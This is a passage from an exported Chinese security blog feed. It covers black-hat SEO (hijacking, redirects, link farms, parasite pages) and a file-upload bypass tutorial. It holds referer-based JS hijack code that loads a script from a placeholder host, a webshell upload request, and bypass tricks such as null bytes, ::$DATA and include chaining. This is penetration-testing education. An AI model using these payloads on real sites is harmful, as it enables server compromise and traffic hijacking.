<h4 id="js劫持案例"><a href="#js劫持案例" class="headerlink" title="js劫持案例"></a>js劫持案例</h4><p>效果：通过搜索引擎搜索点击页面（执行一段js）跳转到博彩页面；直接输入网址访问网页，跳转到404页面。<br>代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">today=new Date();</div><div class="line">today=today.getYear()+<span class="string">"-"</span>+(today.getMonth()+1)+<span class="string">"-"</span>+today.getDate();</div><div class="line">var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+)&#123;1,2&#125;\//ig;</div><div class="line">var <span class="built_in">where</span> =document.referer;</div><div class="line"><span class="keyword">if</span>(regexp.test(<span class="built_in">where</span>))&#123;</div><div class="line">document.write (<span class="string">'&lt;script language="javascript" type="text/javascript" src="http://www.xxx.com/test.js"&gt;&lt;/script&gt;'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">window.location.href=<span class="string">"../../404.htm"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>分析：通过referer判断来路，如果referer来路为空就是跳转到404页面，如果是搜索引擎来的referer里面也会有显示，然后在写代码控制跳转。如果只是控制实现显示不同的内容，可以修改php、asp代码；如果需要劫持搜索引擎搜索框，可以写JS代码来做浏览器本地跳转。当然js功能可以无限扩展，比如可以控制一个ip一天内第一次访问正常，其余访问跳转等等。</p>
<h4 id="header劫持"><a href="#header劫持" class="headerlink" title="header劫持"></a>header劫持</h4><p>在源代码中写入以下代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=“refresh“ content=“10; url=http://thief.one“&gt;</div></pre></td></tr></table></figure></p>
<p>利用的就是Meta Refresh Tag（自动转向），将流量引走。</p>
<h3 id="手法对比"><a href="#手法对比" class="headerlink" title="手法对比"></a>手法对比</h3><h4 id="客户端劫持与服务端区别"><a href="#客户端劫持与服务端区别" class="headerlink" title="客户端劫持与服务端区别"></a>客户端劫持与服务端区别</h4><p>客户端劫持：每次访问网页从服务端获取到的网页代码都是相同的，只是控制了网页代码在浏览器中呈现的效果（比如是否进行跳转等）。<br>服务端劫持：改变了每次访问网页从服务端获取到的网页代码。</p>
<h4 id="客户端劫持与服务端判断方法"><a href="#客户端劫持与服务端判断方法" class="headerlink" title="客户端劫持与服务端判断方法"></a>客户端劫持与服务端判断方法</h4><p>客户端劫持的判断方法：只需观察浏览器呈现的网页前端代码，查看是否引用了不当的js，或者其它敏感内容。<br>服务端劫持的判断方法：可以通过观察网站后端代码，或者通过改变ip，包头等方式，观察放回源码是否不同。</p>
<p>结语：<em>网页劫持的方法还有很多，我了解的大概只是皮毛，黑帽SEO技术的水很深，前路漫漫。</em></p>
]]></content>
      
        <categories>
            
            <category> 黑产研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 黑帽SEO </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[黑帽SEO之页面跳转]]></title>
      <url>http://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/</url>
      <content type="html"><![CDATA[<p>　　想要更深入地了解黑帽SEO，就必须先了解关于网站的一些基础知识，以及黑帽SEO常见的作弊手法。（可以参考：<a href="http://thief.one/2016/10/09/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">黑帽SEO–基础知识</a>）其中页面跳转便是作弊手法之一，最近我收集了一些关于<em>页面跳转</em>的相关内容，在此汇总分享。<br><a id="more"></a></p>
<h3 id="页面跳转分类"><a href="#页面跳转分类" class="headerlink" title="页面跳转分类"></a>页面跳转分类</h3><h4 id="（一）服务端跳转"><a href="#（一）服务端跳转" class="headerlink" title="（一）服务端跳转"></a>（一）服务端跳转</h4><p>　一般用户不会感觉到跳转的实际行为，往往通过代码去控制，因此有些时候我们也不叫做跳转。具体的服务端跳转行为有很多，各个语言技术都有各自的特点。</p>
<h4 id="（二）客户端跳转"><a href="#（二）客户端跳转" class="headerlink" title="（二）客户端跳转"></a>（二）客户端跳转</h4><p>客户端跳转分为：http层跳转，应用层跳转。<br>应用层跳转分为：html head跳转，js跳转等。</p>
<h5 id="http层跳转"><a href="#http层跳转" class="headerlink" title="http层跳转"></a>http层跳转</h5><p>　http跳转是指server根据工作情况通过http返回状态码，利用http的重定向协议指示客户端浏览器跳转到相应页面的过程，一般返回码是302。</p>
<h5 id="html-head跳转（HTML-refresh）"><a href="#html-head跳转（HTML-refresh）" class="headerlink" title="html head跳转（HTML refresh）"></a>html head跳转（HTML refresh）</h5><p>在html代码的head中添加特殊标签，如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"5"</span>; url=<span class="string">"http://thief.one/"</span> /&gt;</div></pre></td></tr></table></figure></p>
<p>表示：5秒之后转到One Thief首页，这个跳转需要浏览器具体解析html后采能进行。</p>
<h5 id="js跳转"><a href="#js跳转" class="headerlink" title="js跳转"></a>js跳转</h5><p>通过在html代码中添加js代码，通过js代码实现跳转：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"javascript"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</div><div class="line">window.location.href=<span class="string">"http://thief.one"</span>;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>这个跳转应该比html head跳转更向后延迟。</p>
<h4 id="各种跳转包含关系"><a href="#各种跳转包含关系" class="headerlink" title="各种跳转包含关系"></a>各种跳转包含关系</h4><ul>
<li>服务端跳转</li>
<li>客户端跳转<ul>
<li>http跳转</li>
<li>应用层跳转<ul>
<li>html head跳转</li>
<li>html js跳转</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><hr></p>
<h3 id="各种跳转介绍"><a href="#各种跳转介绍" class="headerlink" title="各种跳转介绍"></a>各种跳转介绍</h3><h4 id="（一）服务端跳转-1"><a href="#（一）服务端跳转-1" class="headerlink" title="（一）服务端跳转"></a>（一）服务端跳转</h4><p>介绍：跳转发生在服务器上，用户不会有任何感觉。<br>优点：跳转行为在server进行， 一次tcp连接完成相关操作，对用户是透明的，不会造成疑惑。<br>缺点：对用户隐藏了信息，跳转行为都发生在server端，对server有压力。</p>
<h4 id="（二）http跳转"><a href="#（二）http跳转" class="headerlink" title="（二）http跳转"></a>（二）http跳转</h4><p>介绍：跳转发生在服务端发生数据给客户端过程中，用户能够感觉到，并且状态码往往为302。<br>优点：响应速度快，在http1.1协议下通过合适的设置可以使用同一个tcp连接，节省网络时间，服务器及用户端都不需要进行额外的数据处理工作，节省时间。<br>缺点：仅仅能做跳转没有其他功能，基于js及html的跳转可以选择延时跳转，但是302无法选择延时跳转等。</p>
<h4 id="（三）html-head跳转"><a href="#（三）html-head跳转" class="headerlink" title="（三）html head跳转"></a>（三）html head跳转</h4><p>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到。<br>优点：跳转方式灵活，可以指定延时跳转等等<br>缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。</p>
<h4 id="（四）-js跳转"><a href="#（四）-js跳转" class="headerlink" title="（四） js跳转"></a>（四） js跳转</h4><p>介绍：跳转发生在服务端已经将数据传输到客户端以后，用户能够感觉到<br>优点：跳转方式灵活，可以指定延时跳转等等<br>缺点：可能多次建立tcp连接，在低速网络下效率更低，浪费客户端的时间。</p>
<p>参考文章：<a href="http://www.iigrowing.cn/ye-mian-zi-dong-tiao-zhuan-yu-http302-html-refresh-yi-ji-js-tiao-zhuan-zhi-jian-de-guan-xi.html" target="_blank" rel="external">http://www.iigrowing.cn/</a><br>欢迎留言交流补充!</p>
]]></content>
      
        <categories>
            
            <category> 黑产研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 黑帽SEO </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[黑帽SEO之基础知识]]></title>
      <url>http://thief.one/2016/10/09/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      <content type="html"><![CDATA[<p>　 SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。既然有SEO技术，便会有相应的从业人员，他们被称为白帽SEO，专指通过公正SEO手法，帮助提升站点排名的专业人员。<br><a id="more"></a>　 当然有白便会有黑，由于白帽SEO优化的过程将会十分漫长，一个新站想要获取好的排名，往往需要花上几年时间做优化推广。因此一些想要快速提升自身网站排名的小伙伴，便开始在SEO上研究作弊手法，从而诞生了黑帽SEO。黑帽SEO是指通过作弊手段，让站点快速提升排名的一类SEO技术，或者说是黑客技术，比如说：黑链（暗链）、站群、网站劫持、桥页等，黑帽SEO能够快速提升排名，但毕竟是违规作弊行为，容易被K。<br>　 白帽与黑帽的优缺点显而易见，换句话说两者皆不完美，因此便又诞生了灰帽SEO，介于两者之间，既不违规，又可以较快速的提升排名。由于项目需要，最近开始接触一些黑帽SEO的知识，在此总结分享，欢迎指正！</p>
<h3 id="黑帽SEO基础概念"><a href="#黑帽SEO基础概念" class="headerlink" title="黑帽SEO基础概念"></a>黑帽SEO基础概念</h3><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p>概念：域名由两个或两个以上的词构成，中间由点号分隔开，最右边的那个词称为顶级域名。</p>
<blockquote>
<h5 id="顶级域名"><a href="#顶级域名" class="headerlink" title="顶级域名"></a>顶级域名</h5><p>我们接触的顶级域名又分为两类：<br>1.国家和地区顶级域名，目前200多个国家分配了顶级域名，例如中国是cn，日本是jp等；<br>2.国际顶级域名，例如表示工商企业的.com，表示网络提供商的.net，表示非盈利组织的.org等。</p>
<h5 id="一级域名"><a href="#一级域名" class="headerlink" title="一级域名"></a>一级域名</h5><p>一级域名就是在com net org前加一级，比如：baidu.com，thief.one等。</p>
<h5 id="二级域名"><a href="#二级域名" class="headerlink" title="二级域名"></a>二级域名</h5><p>news.baidu.com，tieba.baidu.com等都是二级域名。</p>
</blockquote>
<h4 id="泛站群"><a href="#泛站群" class="headerlink" title="泛站群"></a>泛站群</h4><h5 id="泛二级域名站群"><a href="#泛二级域名站群" class="headerlink" title="泛二级域名站群"></a>泛二级域名站群</h5><p><img src="/upload_image/20161009/2.png" alt=""><br>前提：在做域名解析的时候，选择了*<br>操作：进入服务器，可以借助泛二级域名建站工具，批量创建二级域名站点，从而实现站群的效果。</p>
<h5 id="泛端口站群"><a href="#泛端口站群" class="headerlink" title="泛端口站群"></a>泛端口站群</h5><p><img src="/upload_image/20161009/1.png" alt=""><br>操作：先要获得操作目标站点的服务器权限，进入服务器之后，可以使用泛端口站群建设工具，批量创建泛端口站点。主要是在iis里面批量创建站点，绑定站点对应的端口。对于泛端口站点，一定要注意一些重要端口别占用了，否则可以导致服务器出错。一般泛站，用的比较多的是Dedecms程序。</p>
<h4 id="站中站"><a href="#站中站" class="headerlink" title="站中站"></a>站中站</h4><p>　 就是在权重高的网站中创建一个自己的网站，其实就是添加很多外链，蜘蛛会认为这些网站也是属于高权重网站的内容，因此权重也会比较高。但是由于这种做法太泛滥，导致百度修改了爬虫算法。</p>
<h4 id="链轮"><a href="#链轮" class="headerlink" title="链轮"></a>链轮</h4><p><img src="/upload_image/20161009/3.png" alt=""><br>　 Y是想要推广的网站，W是自己控制的外部网站，首先可以搞多个网站，一层层外链下去，形成链轮。当想要推广某个网站时，可以在所有外部网站上添加Y的外链。谷歌貌已经对此不友好，百度还可以尝试。</p>
<h4 id="蜘蛛池"><a href="#蜘蛛池" class="headerlink" title="蜘蛛池"></a>蜘蛛池</h4><p>　 蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。</p>
<h4 id="寄生虫"><a href="#寄生虫" class="headerlink" title="寄生虫"></a>寄生虫</h4><p>　 寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。</p>
<p><hr></p>
<h3 id="黑帽SEO作弊手法"><a href="#黑帽SEO作弊手法" class="headerlink" title="黑帽SEO作弊手法"></a>黑帽SEO作弊手法</h3><p>SEO作弊手法不仅仅是为了提升网站排名，也有可能是为了陷害对手网站，降低其排名。</p>
<h4 id="PR劫持"><a href="#PR劫持" class="headerlink" title="PR劫持"></a>PR劫持</h4><p>　 往往是利用301或者302跳转，因为搜索引擎在处理301，302跳转时，把目标URL当做实际收录的URL。<br>　 即当从A域名302到B域名，而B域名的PR值比较高时，域名A在更新PR值后，也会显示域名B的PR值，也就是说可以提升A的PR值。利用这一点，可以先将自己网站302跳转到一个PR高的网站，等PR值更新后，取消转向，放上自己的内容，这样可以维持到下一次PR值更新，大概两三个月的时间。</p>
<h4 id="网站跳转"><a href="#网站跳转" class="headerlink" title="网站跳转"></a>网站跳转</h4><p>详细参考：<a href="http://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E2%80%94%E2%80%94%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/">黑帽SEO之页面跳转</a></p>
<h4 id="隐藏页面"><a href="#隐藏页面" class="headerlink" title="隐藏页面"></a>隐藏页面</h4><p>　 隐藏页面指的是页面使用程序判断访问者是普通用户还是搜索引擎蜘蛛。如果是普通用户，程序返回一个不考虑SEO，只给用户看的页面；如果是搜索引擎蜘蛛，程序就返回一个高度优化的，但是由于优化后无法阅读的页面。</p>
<h4 id="隐藏文字"><a href="#隐藏文字" class="headerlink" title="隐藏文字"></a>隐藏文字</h4><p>　 隐藏文字指的是网页上用户看不到，但搜索引擎能看到的文字，可以通过改变文字颜色，位置，大小等方式，代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;div style=<span class="string">"display:none"</span>&gt;隐藏文字&lt;/div&gt;</div><div class="line">positon:absolute;</div><div class="line">margin-right:-1000000px;</div></pre></td></tr></table></figure></p>
<h4 id="垃圾连接"><a href="#垃圾连接" class="headerlink" title="垃圾连接"></a>垃圾连接</h4><p>　 垃圾连接通常指站长为了提高网站排名，去各大论坛网站留言，留下自己的连接，一般通过群发软件完成这一操作。这种手法，容易被过滤掉，一些浏览器的插件或者博客的插件可以自动进行垃圾留言过滤。</p>
<h4 id="连接农场"><a href="#连接农场" class="headerlink" title="连接农场"></a>连接农场</h4><p>　 链接农场指的是整个网站或者部分网页，没有实质内容，完全是为了交换链接而存在。该页面上全部是链接到其他网站，其他网站再链回来，互相交叉。</p>
<h4 id="桥页"><a href="#桥页" class="headerlink" title="桥页"></a>桥页</h4><p>　 桥页也称为“门页”，此页面质量很低，充斥着关键字，完全以关键词排名与流量为目标，不考虑用户体验。当用户访问桥页，一般会有两种情况。</p>
<ul>
<li>页面顶部以大字号连接到其他网站（想要推广的网站），用户因为看不清桥页内容，有时不得不点击连接。</li>
<li>利用页面自动跳转技术。</li>
</ul>
<h4 id="关键词堆积"><a href="#关键词堆积" class="headerlink" title="关键词堆积"></a>关键词堆积</h4><p>关键词堆积指的是在页面上本来没必要出现关键词的地方反复刻意堆积关键词，提高排名。</p>
<h4 id="诱饵替换"><a href="#诱饵替换" class="headerlink" title="诱饵替换"></a>诱饵替换</h4><p>诱饵替换指的是作弊者先通过普通关键词制作页面获得排名后，更改为其他内容。</p>
<h4 id="刷站"><a href="#刷站" class="headerlink" title="刷站"></a>刷站</h4><p>刷站是一种利用程序模拟用户用搜索引擎，搜索某个关键词，然后点击浏览某个网页的行为。</p>
<h4 id="挂暗链（黑链）"><a href="#挂暗链（黑链）" class="headerlink" title="挂暗链（黑链）"></a>挂暗链（黑链）</h4><p>手法：利用CSS，利用DIV+JS，利用JS等<br>作用：利用高权重网站外链来提升自身站点排名。<br>详细参考：<a href="http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/">黑帽SEO之暗链</a></p>
<h4 id="网站劫持"><a href="#网站劫持" class="headerlink" title="网站劫持"></a>网站劫持</h4><p>分类：客户端劫持，服务端劫持，快照劫持等<br>手法：一般利用js或者php、asp等代码，达到劫持网站，控制跳转以及网页效果呈现的目的。<br>作用：利用高权重网站跳转来引流量。<br>详细参考：<a href="http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/">黑帽SEO之网页劫持</a></p>
<h4 id="利用高权重网站二级目录"><a href="#利用高权重网站二级目录" class="headerlink" title="利用高权重网站二级目录"></a>利用高权重网站二级目录</h4><p>手法：将一些博彩网页放在高权重网站的二级目录之下。<br>作用：提高网站排名，引流量。</p>
<h4 id="利用高权重网站二级目录反向代理"><a href="#利用高权重网站二级目录反向代理" class="headerlink" title="利用高权重网站二级目录反向代理"></a>利用高权重网站二级目录反向代理</h4><p>　 通过配置nginx/apache等，设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。<br>　 即浏览者在打开<em><a href="http://thief.one/2016/">http://thief.one/2016/</a></em>目录时，实际访问到的资源是自己服务器上的某个目录（目标服务器会去自己服务器上拿数据），这取决于nginx配置文件的写法。这种手法不需要修改目标服务器网站源码，只需要修改中间件配置文件，不易被删除，不易被发现。</p>
<p><em>持续更新…….</em></p>
<p>参考：黑帽SEO论坛、SEO实战密码</p>
]]></content>
      
        <categories>
            
            <category> 黑产研究 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 黑帽SEO </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件上传漏洞（绕过姿势）]]></title>
      <url>http://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/</url>
      <content type="html"><![CDATA[<p>　　文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。（根据个人经验总结，欢迎补充纠错~~）<br><a id="more"></a></p>
<h3 id="文件上传校验姿势"><a href="#文件上传校验姿势" class="headerlink" title="文件上传校验姿势"></a>文件上传校验姿势</h3><ul>
<li>客户端javascript校验（一般只校验后缀名）</li>
<li>服务端校验<ul>
<li>文件头content-type字段校验（image/gif）</li>
<li>文件内容头校验（GIF89a）</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
<li>自定义正则校验</li>
</ul>
</li>
<li>WAF设备校验（根据不同的WAF产品而定）</li>
</ul>
<h4 id="1-客户端校验"><a href="#1-客户端校验" class="headerlink" title="1.客户端校验"></a>1.客户端校验</h4><p>　　一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。<br>　　判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>
<h4 id="2-服务端校验"><a href="#2-服务端校验" class="headerlink" title="2.服务端校验"></a>2.服务端校验</h4><h5 id="2-1-content-type字段校验"><a href="#2-1-content-type字段校验" class="headerlink" title="2.1 content-type字段校验"></a>2.1 content-type字段校验</h5><p>　　这里以PHP代码为例，模拟web服务器端的校验代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)  <span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></div><div class="line">                &#123;   </div><div class="line">                 <span class="built_in">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</div><div class="line">                 <span class="built_in">exit</span>;</div><div class="line">                 &#125;</div><div class="line">         <span class="variable">$uploaddir</span> = <span class="string">'uploads/'</span>;</div><div class="line">         <span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . basename(<span class="variable">$_FILES</span>[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</div><div class="line">         <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], <span class="variable">$uploadfile</span>))</div><div class="line">             &#123;</div><div class="line">                 <span class="built_in">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                     <span class="built_in">echo</span> <span class="string">"File uploading failed.\n"</span>;</div><div class="line">    &#125;</div><div class="line">     ?&gt;</div></pre></td></tr></table></figure></p>
<p>　　可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
<h5 id="2-2-文件头校验"><a href="#2-2-文件头校验" class="headerlink" title="2.2 文件头校验"></a>2.2 文件头校验</h5><p>　　可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：<br>（1）  .JPEG;.JPE;.JPG，”JPGGraphic File”<br>（2）  .gif，”GIF 89A”<br>（3）  .zip，”Zip Compressed”<br>（4）  .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p>
<p><hr></p>
<h3 id="文件上传绕过校验姿势"><a href="#文件上传绕过校验姿势" class="headerlink" title="文件上传绕过校验姿势"></a>文件上传绕过校验姿势</h3><ul>
<li>客户端绕过（抓包改包）</li>
<li>服务端绕过<ul>
<li>文件类型</li>
<li>文件头</li>
<li>文件后缀名</li>
</ul>
</li>
<li>配合文件包含漏洞绕过</li>
<li>配合服务器解析漏洞绕过</li>
<li>CMS、编辑器漏洞绕过</li>
<li>配合操作系统文件命名规则绕过</li>
<li>配合其他规则绕过</li>
<li>WAF绕过</li>
</ul>
<h4 id="1-客户端绕过"><a href="#1-客户端绕过" class="headerlink" title="1.客户端绕过"></a>1.客户端绕过</h4><p>　　可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
<h4 id="2-服务端绕过"><a href="#2-服务端绕过" class="headerlink" title="2.服务端绕过"></a>2.服务端绕过</h4><h5 id="2-1-文件类型绕过"><a href="#2-1-文件类型绕过" class="headerlink" title="2.1 文件类型绕过"></a>2.1 文件类型绕过</h5><p>　　我们可以通过抓包，将content-type字段改为image/gif<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">POST /upload.php HTTP/1.1</div><div class="line">TE: deflate,gzip;q=0.3</div><div class="line">Connection: TE, close</div><div class="line">Host: localhost</div><div class="line">User-Agent: libwww-perl/5.803</div><div class="line">Content-Type: multipart/form-data; boundary=xYzZY</div><div class="line">Content-Length: 155</div><div class="line">--xYzZY</div><div class="line">Content-Disposition: form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span></div><div class="line">Content-Type: image/gif (原为 Content-Type: text/plain)</div><div class="line">&lt;?php system(<span class="variable">$_GET</span>[<span class="string">'command'</span>]);?&gt;</div><div class="line">--xYzZY-</div></pre></td></tr></table></figure></p>
<h5 id="2-2-文件头绕过"><a href="#2-2-文件头绕过" class="headerlink" title="2.2 文件头绕过"></a>2.2 文件头绕过</h5><p>　　在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a&lt;?php phpinfo(); ?&gt;</p>
<h5 id="2-3-文件后缀名绕过"><a href="#2-3-文件后缀名绕过" class="headerlink" title="2.3 文件后缀名绕过"></a>2.3 文件后缀名绕过</h5><p>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。<br>绕过方法：<br>（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类<br>（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br>能被解析的文件扩展名列表：<br>jsp  jspx  jspf<br>asp  asa  cer  aspx<br>php  php  php3  php4<br>exe  exee</p>
<h4 id="3-配合文件包含漏洞"><a href="#3-配合文件包含漏洞" class="headerlink" title="3.配合文件包含漏洞"></a>3.配合文件包含漏洞</h4><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#PHP    </span></div><div class="line">&lt;?php Include(<span class="string">"上传的txt文件路径"</span>);?&gt; </div><div class="line"><span class="comment">#ASP    </span></div><div class="line">&lt;!--<span class="comment">#include file="上传的txt文件路径" --&gt;</span></div><div class="line"><span class="comment">#JSP    </span></div><div class="line">&lt;jsp:inclde page=<span class="string">"上传的txt文件路径"</span>/&gt;</div><div class="line">or  </div><div class="line">&lt;%@include file=<span class="string">"上传的txt文件路径"</span>%&gt;</div></pre></td></tr></table></figure></p>
<h4 id="4-配合服务器解析漏洞"><a href="#4-配合服务器解析漏洞" class="headerlink" title="4.配合服务器解析漏洞"></a>4.配合服务器解析漏洞</h4><p>详细可参考：<a href="http://thief.one/2016/09/21/服务器解析漏洞/">http://thief.one/2016/09/21/服务器解析漏洞/</a></p>
<h4 id="5-配合操作系统文件命令规则"><a href="#5-配合操作系统文件命令规则" class="headerlink" title="5.配合操作系统文件命令规则"></a>5.配合操作系统文件命令规则</h4><p>（1）上传不符合windows文件命名规则的文件名<br>　　test.asp.<br>　　test.asp(空格)<br>　　test.php:1.jpg<br>　　test.php::$DATA<br>　　shell.php::$DATA…….<br>会被windows系统自动去掉不符合规则符号后面的内容。<br>（2）linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
<h4 id="6-CMS、编辑器漏洞"><a href="#6-CMS、编辑器漏洞" class="headerlink" title="6.CMS、编辑器漏洞"></a>6.CMS、编辑器漏洞</h4><p>（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。<br>（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>这两方面的漏洞以后单独成文汇总，这里点到为止。</p>
<h4 id="7-配合其他规则"><a href="#7-配合其他规则" class="headerlink" title="7.配合其他规则"></a>7.配合其他规则</h4><p>（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候<br>　　test.php(0x00).jpg<br>　　test.php%00.jpg<br>　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg<br>伪代码演示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</div><div class="line"><span class="built_in">type</span> =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</div><div class="line"><span class="keyword">if</span>(<span class="built_in">type</span> == jpg)</div><div class="line">   SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断</div><div class="line">//最后以 help.asp 存入路径里</div></pre></td></tr></table></figure></p>
